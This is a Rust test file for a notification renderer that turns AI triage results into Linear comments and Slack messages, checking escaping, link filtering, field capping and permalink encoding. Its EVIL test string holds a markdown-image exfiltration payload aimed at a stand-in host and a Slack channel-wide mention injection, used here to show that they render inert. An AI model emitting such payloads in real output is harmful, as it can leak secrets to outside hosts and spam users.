//! Templates (intake.md "Testing"): model text with images, mentions and links renders inert;
//! only Mage-built links appear; Slack minimal mode carries no model text.

use mage_core::domain::{CommitSha, LineRange, RepoId, RepoPath};
use uuid::Uuid;

use super::*;

const EVIL: &str = "![x](https://evil/?q=secret) <!channel> [link](https://evil) `code` # head | pipe";

fn links_base() -> Url {
    Url::parse("https://mage.example/").unwrap()
}

fn ctx(detail: NoticeDetail) -> NoticeContext {
    NoticeContext {
        ticket_id: TicketId::from_uuid(Uuid::from_u128(1)),
        identifier: "ENG-412".into(),
        target: Some(TargetLine { sha: CommitSha::from_bytes([0x3f; 20]), origin: TargetOrigin::Deployment { environment: "production".into() }, deployed_at: None }),
        repo: Some(("hoophq".into(), "hoop".into())),
        detail,
    }
}

fn citation(path: &str) -> Citation {
    Citation {
        repo_id: RepoId::from_uuid(Uuid::from_u128(2)),
        sha: CommitSha::from_bytes([0x3f; 20]),
        path: RepoPath::new(path).unwrap(),
        lines: LineRange::new(118, 141).unwrap(),
        snippet_hash: None,
        note: None,
    }
}

fn triage(title: &str) -> NoticeDetail {
    NoticeDetail::TriageReady { causes: vec![CauseLine { title: title.into(), confidence: 0.72, citations: vec![citation("gateway/session.go")] }], total: 1 }
}

/// Every `](` link target in the markdown, in order.
fn link_targets(md: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = md;
    while let Some(i) = rest.find("](") {
        // An escaped `\]\(` is not a link.
        let escaped = i > 0 && rest[..i].ends_with('\\');
        let after = &rest[i + 2..];
        let end = after.find(')').unwrap_or(after.len());
        if !escaped {
            out.push(after[..end].to_owned());
        }
        rest = &after[end..];
    }
    out
}

#[test]
fn model_text_is_inert_in_linear_and_slack() {
    let links = Links { public_url: &links_base() };
    let mut cfg = NotifyConfig::default();
    for slack_detail in [SlackDetail::Minimal, SlackDetail::Full] {
        cfg.slack_detail = slack_detail;
        let r = render(&ctx(triage(EVIL)), &cfg, &links);
        let md = r.linear_markdown.unwrap();
        assert!(!md.contains("![x]") && !md.contains("[link](https://evil)"), "{md}");
        assert!(md.contains("\\!\\[x\\]\\(https://evil/?q=secret\\)"), "{md}");
        assert!(md.contains("\\<\\!channel\\>") && md.contains("\\`code\\`") && md.contains("\\# head \\| pipe"));
        for target in link_targets(&md) {
            assert!(target.starts_with("https://github.com/hoophq/hoop/blob/") || target.starts_with("https://mage.example/"), "{target}");
        }
        assert!(!r.chat_text.contains('\n'));
        match slack_detail {
            SlackDetail::Minimal => assert!(!r.chat_text.contains("evil") && !r.chat_text.contains("channel"), "{}", r.chat_text),
            // Full detail includes the title as plain text; the Slack adapter escapes `<` `>` `&`.
            SlackDetail::Full => assert!(r.chat_text.contains("<!channel>")),
        }
        assert_eq!(r.chat_link.as_ref().map(|(u, _)| u.as_str().to_owned()), Some("https://mage.example/tickets/tkt_00000000000000000000000001".into()));
    }
}

#[test]
fn fields_are_folded_and_capped() {
    let long = format!("line one\nline two {}", "x".repeat(400));
    let f = fold(&long);
    assert_eq!(f.chars().count(), FIELD_MAX_CHARS);
    assert!(f.starts_with("line one line two ") && f.ends_with('…'));
}

#[test]
fn triage_comment_matches_the_documented_shape() {
    let links = Links { public_url: &links_base() };
    let md = render(&ctx(triage("Session token not refreshed after SSO re-login")), &NotifyConfig::default(), &links).linear_markdown.unwrap();
    let sha = "3f".repeat(20);
    assert_eq!(
        md,
        format!(
            "**Mage triage** · target `3f3f3f3` (deployed to `production`)\n\n1. **Session token not refreshed after SSO re-login** · confidence 0.72\n   [`gateway/session.go:118-141@3f3f3f3`](https://github.com/hoophq/hoop/blob/{sha}/gateway/session.go#L118-L141)\n\n[Open in Mage](https://mage.example/tickets/tkt_00000000000000000000000001) to run a diagnostic."
        )
    );
}

#[test]
fn permalink_segments_are_percent_encoded() {
    let url = permalink("acme", "shop", &citation("src/a b/#weird?.go")).unwrap();
    assert_eq!(url.as_str(), format!("https://github.com/acme/shop/blob/{}/src/a%20b/%23weird%3F.go#L118-L141", "3f".repeat(20)));
}

#[test]
fn verdict_subtitles_and_brief_modes() {
    let links = Links { public_url: &links_base() };
    let cfg = NotifyConfig::default();
    let verdict = |outcome| NoticeDetail::DiagnosisVerdict {
        run_id: RunId::from_uuid(Uuid::from_u128(3)),
        cause_rank: 2,
        cause_title: "t".into(),
        outcome,
        gate_attempt: Some(1),
        script: None,
        video: None,
        trace: None,
        video_asset: None,
    };
    let sub = |o| render(&ctx(verdict(o)), &cfg, &links).attachment_subtitle;
    assert_eq!(sub(DiagnosisOutcome::Reproduced), "Reproduced · cause #2");
    assert_eq!(sub(DiagnosisOutcome::NotReproduced), "Not reproduced");
    assert_eq!(sub(DiagnosisOutcome::GateFailed { attempts: 3 }), "Not reproduced");
    assert_eq!(sub(DiagnosisOutcome::Inconclusive { reason: "x".into() }), "Inconclusive");

    let brief = |mode| NoticeDetail::FixBriefReady {
        cause_id: CauseId::from_uuid(Uuid::from_u128(4)),
        cause_title: "Race in pool".into(),
        version: 2,
        mode,
        brief_markdown: "# Brief\nsecret test credentials".into(),
    };
    assert_eq!(render(&ctx(brief(BriefInLinear::Off)), &cfg, &links).linear_markdown, None);
    let summary = render(&ctx(brief(BriefInLinear::Summary)), &cfg, &links).linear_markdown.unwrap();
    assert!(summary.contains("Race in pool") && !summary.contains("credentials"));
    let full = render(&ctx(brief(BriefInLinear::Full)), &cfg, &links).linear_markdown.unwrap();
    assert!(full.contains("# Brief\nsecret test credentials"));
}
